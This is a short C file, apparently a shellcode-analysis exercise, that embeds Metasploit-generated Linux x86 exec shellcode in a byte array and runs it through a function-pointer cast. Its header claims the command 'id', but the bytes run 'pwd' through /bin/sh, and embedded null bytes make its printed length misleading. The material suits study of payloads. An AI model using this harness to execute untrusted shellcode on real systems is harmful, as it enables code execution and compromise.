// Linux/x86/exec shellcode analysis
// msfpayload linux/x86/exec CMD=id C
// Filename: exec.c
// Author: Oleg Boytsev
// License http://creativecommons.org/licenses/by-sa/3.0/
// Legitimate use and research only
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

#include<stdio.h>
#include<string.h>

unsigned char shellcode[] =
"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68"
"\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x04\x00\x00\x00\x70"
"\x77\x64\x00\x57\x53\x89\xe1\xcd\x80";
main()
{
        printf("Shellcode Length: %d\n",strlen(shellcode));
        int (*ret)() = (int(*)())shellcode;
        ret();
}
